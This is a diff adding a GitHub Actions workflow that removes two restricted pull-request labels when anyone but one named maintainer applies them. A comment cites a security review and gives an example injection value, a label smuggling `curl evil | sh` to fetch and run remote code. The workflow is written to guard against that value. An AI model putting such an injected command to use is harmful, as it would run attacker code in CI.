@@ -1,0 +1,77 @@
+name: CI — Label Gate (matt-only)
+
+on:
+  pull_request_target:
+    types: [labeled]
+
+permissions:
+  pull-requests: write
+
+jobs:
+  label-gate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check label permissions
+        run: |
+          # Matt-only labels — add to this list as needed
+          MATT_ONLY_LABELS=(
+            "reed-reviewed"
+            "skill-sync-checked"
+          )
+
+          # #3106 H2 (Reed's security review): these three come from the
+          # env: block below, not a raw GitHub-expression interpolation
+          # inlined directly into this script body -- a label named e.g.
+          # `"; curl evil | sh #` would otherwise be substituted into the
+          # script's literal text BEFORE bash ever runs it, same injection
+          # class spec-first.yml's PR_BODY_ENV already guards against for
+          # PR body text.
+          LABEL_NAME="$LABEL_NAME_ENV"
+          SENDER="$SENDER_ENV"
+          PR_NUMBER="$PR_NUMBER_ENV"
+
+          # Check if the applied label is in the matt-only list
+          PROTECTED=false
+          for label in "${MATT_ONLY_LABELS[@]}"; do
+            if [ "$label" = "$LABEL_NAME" ]; then
+              PROTECTED=true
+              break
+            fi
+          done
+
+          if [ "$PROTECTED" = "false" ]; then
+            echo "✅ Label '$LABEL_NAME' is not restricted"
+            exit 0
+          fi
+
+          # Check if sender is Matt
+          if [ "$SENDER" = "matthewcarano" ]; then
+            echo "✅ '$LABEL_NAME' applied by $SENDER — authorized"
+            exit 0
+          fi
+
+          # Unauthorized — remove label and post comment
+          echo "❌ '$LABEL_NAME' applied by $SENDER — NOT authorized"
+          echo "Removing label and posting comment..."
+
+          gh pr edit "$PR_NUMBER" --repo ThreeLaneStudios/pane --remove-label "$LABEL_NAME"
+
+          gh pr comment "$PR_NUMBER" --repo ThreeLaneStudios/pane --body "$(cat <<EOF
+          ⚠️ **Label Gate Violation**
+          
+          $LABEL_NAME was applied by @$SENDER and has been automatically removed.
+          
+          This label can only be applied by @matthewcarano after reading Reed's PR review comments.
+          
+          See: #627 (label gate mechanized 2026-04-24)
+          EOF
+          )"
+
+          echo "Label removed and comment posted."
+          # Exit 0 — the gate's job is to remove the label, not to fail the workflow
+          exit 0
+        env:
+          GH_TOKEN: ${{ github.token }}
+          LABEL_NAME_ENV: ${{ github.event.label.name }}
+          SENDER_ENV: ${{ github.event.sender.login }}
+          PR_NUMBER_ENV: ${{ github.event.pull_request.number }}
